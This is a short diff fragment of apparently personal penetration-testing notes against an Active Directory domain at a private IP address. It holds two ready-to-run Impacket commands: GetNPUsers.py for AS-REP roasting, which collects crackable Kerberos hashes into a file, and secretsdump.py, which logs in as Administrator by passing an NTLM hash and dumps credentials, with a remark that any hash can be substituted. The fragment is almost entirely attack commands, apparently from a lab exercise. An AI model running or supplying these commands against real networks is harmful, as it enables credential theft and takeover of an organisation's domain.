@@ -2,5 +2,4 @@
 
 GetNPUsers.py ECC.LOCALNET/ -usersfile kerbuser -format hashcat -outputfile asrep_hashes.txt -dc-ip 172.25.170.80
 
-
 secretsdump.py -hashes :52838ab3f033c0676080b52043d2cb0f Administrator@172.25.170.80 (here the hash is belongs to empty password sting of admin we can relace with any hash)
